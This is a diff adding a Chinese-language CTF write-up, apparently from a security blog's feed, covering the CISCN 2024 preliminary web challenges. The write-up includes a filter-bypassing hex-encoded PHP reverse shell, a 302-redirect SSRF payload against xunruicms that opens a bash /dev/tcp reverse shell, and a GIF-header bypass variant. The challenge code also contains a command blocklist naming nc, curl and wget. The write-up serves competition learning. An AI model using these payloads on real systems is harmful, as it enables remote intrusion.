@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>第十七届全国大学生信息安全竞赛创新实践能力赛初赛-web</title>
+    <link href="/2024/05/22/%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E5%88%9D%E8%B5%9B-web/"/>
+    <url>/2024/05/22/%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E5%88%9D%E8%B5%9B-web/</url>
+    
+    <content type="html"><![CDATA[<h3 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>);<br>error_reporting(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span>(isset($_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>    $cmd = escapeshellcmd($_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <br>     <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, $cmd)) &#123;<br>         system($cmd);<br>&#125;<br>&#125;<br><br><br>show_source(__FILE__);<br>?&gt;<br></code></pre></td></tr></table></figure><p>无参rce<br>可以用php -r 执行php代码<br>可以用16进制绕过反弹shell<br>这里hex2bin接收字符串，但是过滤了引号<br>substr不带引号传入参数虽然会报错但仍会执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">$shell = <span class="hljs-built_in">hex</span>($sock=fsockopen(<span class="hljs-string">&quot;ip&quot;</span>,<span class="hljs-number">6666</span>);system(<span class="hljs-string">&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);)<br>cmd=php -r <span class="hljs-built_in">eval</span>(hex2bin(substr(a$shell,<span class="hljs-number">1</span>)));<br></code></pre></td></tr></table></figure><p>flag在数据库中<br><img src="/mdimg/ciscn2024/1716091216481-65a0dfdf-a094-4f37-a0a8-4335b2beb2a0.jpeg" alt="1716091213182.jpg"></p><h3 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h3><p>扫到一个flag.php<br>后面提示<br><img src="/mdimg/ciscn2024/1716091481274-aa3ceb98-1b7a-4fe3-94d7-58955b4a6d7d.png"><br>要ssrf来利用flag.php<br>找xunruicms的洞<br>在官网公示的漏洞里找到ssrf<br><img src="/mdimg/ciscn2024/1716091727963-01b15570-9ca5-48ce-bbf4-9cf76e3df86f.png"><br><a href="https://codeload.github.com/dayrui/xunruicms/zip/refs/heads/master">https://codeload.github.com/dayrui/xunruicms/zip/refs/heads/master</a><br>在<code>dayrui\Fcms\Core\Helper.php</code><br><img src="/mdimg/ciscn2024/1716109624503-89020950-dc94-4243-9dc1-78ecb143e4a5.png"><br>可以访问外链<br>利用302跳转绕过127.0.0.1 利用flag.php弹shell<br>在vps写一个302跳转的网页</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php header(<span class="hljs-string">&#x27;Location: http://127.0.0.1/flag.php?cmd=bash -c &quot;bash -i &gt;&amp;/dev/tcp/ip/6666 0&gt;&amp;1&quot;&#x27;</span>,true,<span class="hljs-number">302</span>); exit(); ?&gt;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">?s=api<span class="hljs-variable">&amp;c</span>=api<span class="hljs-variable">&amp;m</span>=qrcode<span class="hljs-variable">&amp;text</span>=1<span class="hljs-variable">&amp;thumb</span>=http://ip/<span class="hljs-variable">&amp;size</span>=10<span class="hljs-variable">&amp;level</span>=1<br></code></pre></td></tr></table></figure><p><img src="/mdimg/ciscn2024/1716091580346-4ef6f2b0-8544-4823-8572-a9f2ffcb3425.png"></p><h3 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h3><p>加了验证，利用GIF头绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">GIF89a &lt;?php echo <span class="hljs-string">&quot;GIF89a&quot;</span>; header(<span class="hljs-string">&#x27;Location: http://127.0.0.1/flag.php?cmd=bash -c &quot;bash -i &gt;&amp;/dev/tcp/ip/6666 0&gt;&amp;1&quot;&#x27;</span>,true,<span class="hljs-number">302</span>); exit(); ?&gt;<br></code></pre></td></tr></table></figure><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">?s=api<span class="hljs-variable">&amp;c</span>=api<span class="hljs-variable">&amp;m</span>=qrcode<span class="hljs-variable">&amp;text</span>=1<span class="hljs-variable">&amp;thumb</span>=http://ip/<span class="hljs-variable">&amp;size</span>=10<span class="hljs-variable">&amp;level</span>=1<br></code></pre></td></tr></table></figure><p><img src="/mdimg/ciscn2024/1716109890528-7e336f78-977e-438c-96d1-66ad640a6352.jpeg" alt="1716109886449.jpg"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTFs</category>
+      
+      <category>比赛Write Up</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>比赛Write Up</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>H&amp;NCTF 2024 -web</title>
     <link href="/2024/05/14/H&amp;NCTF%202024/"/>
     <url>/2024/05/14/H&amp;NCTF%202024/</url>
